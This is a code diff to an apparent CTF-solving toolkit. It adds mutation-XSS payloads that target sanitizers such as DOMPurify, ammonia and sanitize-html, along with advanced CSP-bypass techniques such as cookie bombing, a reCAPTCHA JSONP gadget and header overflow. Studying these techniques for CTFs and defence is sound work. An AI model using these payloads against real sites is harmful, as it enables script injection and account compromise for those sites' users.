@@ -2,7 +2,8 @@
 XSS (Cross-Site Scripting) detection and analysis tools for CTF solving.
 
 Provides automated XSS vulnerability probing, payload generation for filter
-bypass scenarios, and Content-Security-Policy analysis.
+bypass scenarios (including mXSS), and Content-Security-Policy analysis
+with advanced bypass techniques.
 """
 
 import json
@@ -412,6 +413,63 @@ class XssPayloadGenerator:
         "polyglot",
         "encoding_bypass",
         "event_handlers",
+        "mxss",
+    }
+
+    # -- mXSS (Mutation XSS) payloads targeting sanitizer namespace confusion --
+    MXSS_PAYLOADS: Dict[str, List[Dict[str, str]]] = {
+        "dompurify": [
+            {
+                "payload": '<math><mtext><table><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
+                "desc": "MathML namespace switching (DOMPurify < 2.0.17)",
+            },
+            {
+                "payload": '<math><mtext><img src onerror=alert(1)>',
+                "desc": "MathML integration point bypass",
+            },
+            {
+                "payload": '<svg><desc><math><mtext><img src onerror=alert(1)>',
+                "desc": "SVG -> MathML namespace switch",
+            },
+            {
+                "payload": '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path d="</textarea><img onerror=alert(1) src>">',
+                "desc": "Form nesting + MathML namespace confusion",
+            },
+        ],
+        "ammonia": [
+            {
+                "payload": '<annotation-xml encoding="text/html"><title><svg onload=alert(1)>',
+                "desc": "annotation-xml HTML integration point (Hack.lu 2023 Awesomenotes II)",
+            },
+            {
+                "payload": '<math><annotation-xml encoding="text/html"><svg onload=alert(1)>',
+                "desc": "MathML annotation-xml with HTML encoding",
+            },
+        ],
+        "sanitize_html": [
+            {
+                "payload": '<noscript><img src=x onerror=alert(1)></noscript>',
+                "desc": "noscript bypass (parsing differs in HTML vs XHTML mode)",
+            },
+            {
+                "payload": '<xmp><svg onload=alert(1)></xmp>',
+                "desc": "Raw text element bypass",
+            },
+        ],
+        "generic": [
+            {
+                "payload": '<svg><foreignObject><math><annotation-xml encoding="text/html"><body onload=alert(1)>',
+                "desc": "SVG foreignObject + MathML integration point",
+            },
+            {
+                "payload": '<math><mtext><table><mglyph><svg onload=alert(1)>',
+                "desc": "Table inside MathML triggers namespace mutation",
+            },
+            {
+                "payload": '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
+                "desc": "Style content reinterpretation after mutation",
+            },
+        ],
     }
 
     # -- Alternative tags for filter bypass --
@@ -608,6 +666,9 @@ class XssPayloadGenerator:
                 return self._encoding_bypass()
             elif operation == "event_handlers":
                 return self._event_handlers()
+            elif operation == "mxss":
+                sanitizer = (data.get("sanitizer") or "all").lower()
+                return self._mxss(sanitizer)
             else:
                 return f"[XssPayloadGenerator] Error: Operation '{operation}' not implemented."
         except Exception as exc:
@@ -874,6 +935,45 @@ class XssPayloadGenerator:
         return "\n".join(lines)
 
 
+    def _mxss(self, sanitizer: str = "all") -> str:
+        """Generate mXSS (Mutation XSS) payloads for sanitizer bypass."""
+        lines = [
+            "[XssPayloadGenerator] mXSS (Mutation XSS) Payloads",
+            "=" * 50,
+            f"Target Sanitizer: {sanitizer}",
+            "",
+            "mXSS exploits differences between how HTML is parsed during sanitization",
+            "vs. how browsers parse the sanitized output. Namespace confusion between",
+            "HTML, SVG, and MathML is the primary attack vector.",
+            "",
+        ]
+
+        if sanitizer == "all":
+            targets = list(self.MXSS_PAYLOADS.keys())
+        elif sanitizer in self.MXSS_PAYLOADS:
+            targets = [sanitizer]
+        else:
+            targets = list(self.MXSS_PAYLOADS.keys())
+
+        for target in targets:
+            payloads = self.MXSS_PAYLOADS[target]
+            lines.append(f"=== {target.upper()} ===")
+            for entry in payloads:
+                lines.append(f"  Payload: {entry['payload']}")
+                lines.append(f"    Desc: {entry['desc']}")
+                lines.append("")
+            lines.append("")
+
+        lines.append("TIPS:")
+        lines.append("  1. mXSS relies on DOM mutation — test in a real browser")
+        lines.append("  2. The key insight: sanitizer parses HTML one way, browser re-parses differently")
+        lines.append("  3. MathML <annotation-xml encoding='text/html'> is an HTML integration point")
+        lines.append("  4. SVG <foreignObject> is another HTML integration point")
+        lines.append("  5. Table elements inside MathML trigger namespace confusion")
+
+        return "\n".join(lines)
+
+
 class CspAnalyzerTool:
     """
     CspAnalyzerTool: fetch a URL and analyze its Content-Security-Policy for weaknesses.
@@ -1069,6 +1169,40 @@ class CspAnalyzerTool:
                         f"Load arbitrary npm packages from {cdn}: "
                         "https://unpkg.com/malicious-package/evil.js"
                     )
+
+        # --- Advanced CSP Bypass Techniques (2023) ---
+
+        # Cookie bombing: oversized cookies trigger 413 errors served without CSP
+        bypasses.append(
+            "[Advanced] Cookie bombing: set oversized cookies to trigger 413 error pages "
+            "that are typically served without CSP headers. Use document.cookie to set "
+            "many cookies filling the Cookie header."
+        )
+
+        # iframe csp attribute for selective script blocking
+        if "frame-src" not in directives or "'self'" in directives.get("frame-src", []):
+            bypasses.append(
+                "[Advanced] iframe CSP attribute: <iframe csp=\"script-src 'none'\"> can "
+                "strip scripts from framed pages, useful for XS-Leak or selective blocking."
+            )
+
+        # Angular/reCAPTCHA gadgets
+        for cdn in self.BYPASS_CDNS:
+            if cdn in all_values_flat:
+                # Already covered by CDN bypass above, but add gadget-specific tip
+                if "googleapis.com" in cdn:
+                    bypasses.append(
+                        "[Advanced] reCAPTCHA CSP gadget: if www.google.com is whitelisted, "
+                        "use www.google.com/recaptcha/... to load a JSONP endpoint that "
+                        "executes arbitrary JS (Google CTF 2023 NoteNinja technique)."
+                    )
+
+        # Response header overflow
+        bypasses.append(
+            "[Advanced] Response header overflow: if you can inject many Set-Cookie headers "
+            "or large header values, the total response header size may exceed the server/proxy "
+            "limit, causing the CSP header to be dropped (SECCON 2023 SimpleCalc technique)."
+        )
 
         # --- report-uri / report-to ---
         if "report-uri" in directives or "report-to" in directives:
